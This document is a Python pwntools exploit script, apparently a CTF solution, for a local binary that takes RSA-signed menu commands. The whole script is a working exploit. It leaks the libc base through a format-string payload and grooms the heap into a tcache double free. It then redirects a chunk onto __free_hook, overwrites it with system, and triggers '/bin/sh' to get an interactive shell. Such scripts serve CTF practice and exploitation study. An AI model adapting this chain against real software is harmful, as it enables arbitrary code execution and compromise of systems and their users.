from pwn import *
import libnum
import gmpy2
import binascii
context.arch = 'amd64'
# context.log_level = 'debug'
 
p = 7578299081774973675168926220497127633745768478826174746554492422165802765780212810518589529228694315205511189705177457329278843566817056465274478392762585485827514172817826950842752547461016536920016232514874472692360067934908514830732106744500567245807025552586514363470336002166323093239378322678157
q = 16617127
e = 65537
n = p * q
d = gmpy2.invert(e, (p - 1) * (q - 1))


sh = process('./pwn')
script = '''    
    b * $rebase(0x3c30)
    b * $rebase(0x3310)
    b * $rebase(0x37fd)
    b * $rebase(0x2740)
'''
script = '''
    b * $rebase(0x422e)
'''
# gdb.attach(sh,gdbscript=script)

def trans(raw_payload):
    num = libnum.s2n(raw_payload)
    res = pow(num,d,n)
    return binascii.unhexlify(hex(res)[2:])
add_header = b'257\n'
show_header = b'261\n'
dele_header = b'258\n'
def send(p):
    p = trans(p)
    sh.sendafter(b'> ',p+b'##')

def add(n1,id,description=None,size=None,time1=20,time2=30,state_code = 0,n2=b'kkk',n3=b'kkk'):
    if size == None and description != None:
        size = len(description)
    payload = add_header
    payload += n1.ljust(8,b'\x00')
    payload += n2.ljust(8,b'\x00')
    payload += n3.ljust(8,b'\x00')
    payload += p32(id)
    payload += p32(time1)
    payload += p32(time2)
    payload += p32(state_code)
    send(payload)
    if description != None:
        sh.sendlineafter(b'description?(y/n) ',b'y')
        sh.sendafter(b'size: ',str(size).encode())
        sh.sendafter(b'content: ',description)
    else:
        sh.sendlineafter(b'description?(y/n) ',b'n')
    
def show():
    payload = show_header
    send(payload)
def dele(name):
    payload = dele_header
    payload += name.ljust(6,b'\x00')
    send(payload)

add(b'FFFF',3,b'X%10$pK')
# sh.clean()
show()
sh.recvuntil(b'X')
libc = ELF('./libc-2.27.so')
libc_base = int(sh.recvuntil(b'K',drop=True),16) - libc.sym['printf']
libc.address = libc_base
success("libc_base : "+hex(libc_base))

add(b'kkk',0,b'a'*0x6f,0x70) #0
add(b'target',9,b'a'*0x6f,0x70) #1
add(b'ggg',1,b'a'*0x6f,0x70) #2
add(b'lll',2,b'a'*0x6f,0x70) #3
add(b'mmm',4,b'a'*0x6f,0x70) #4
add(b'nnn',5,b'a'*0x6f,0x70) #5
add(b'bbb',6,b'a'*0x6f,0x70) #6
add(b'aaa',7,b'a'*0x6f,0x70) #7
dele(b'kkk')
dele(b'ggg')
dele(b'lll')
dele(b'mmm')
dele(b'nnn')
dele(b'bbb')
dele(b'aaa')
dele(b'target')


add(b'kkk',0,b'x'*0xf,0x10) #0
add(b'ggg',1,b'x'*0xf,0x10) #1
add(b'lll',2,b'x'*0xf,0x10) #2
add(b'mmm',4,b'x'*0xf,0x10) #3
add(b'nnn',5,b'x'*0xf,0x10) #4
add(b'bbb',6,b'x'*0xf,0x10) #5
add(b'aaa',7,b'x'*0xf,0x10) #6
add(b'target',9) #7
# gdb.attach(sh)
# pause()
dele(b'kkk')

add(b'kkk',0,b'a'*0x6f,0x70) #从tcache里腾空
dele(b'target') #double free
# 腾id
dele(b'FFFF')
dele(b'ggg')
dele(b'lll')
dele(b'mmm')
dele(b'nnn')
dele(b'bbb')
dele(b'aaa')

#改fd
add(b'ggg',1,p64(libc.sym['__free_hook']-0x28),0x70)

# 腾id
dele(b'kkk')

add(b'mmm',4,b'a'*0x6f,0x70)
add(b'nnn',5,b'a'*0x6f,0x70)
add(b'bbb',6,b'a'*0x6f,0x70)
add(b'aaa',7,b'a'*0x6f,0x70)
add(b'kkk',0,b'a'*0x6f,0x70)
add(b'lll',2,b'a'*0x6f,0x70)
add(b'ccc',9,b'a'*0x6f,0x70)
add(b'FFFF',3,b'a'*0x6f,0x70)

add(b'sh;',4,b'/bin/sh\x00'.ljust(0x18,b'\x00')+p64(libc.sym['system']),0x70,0,0)


sh.interactive()   

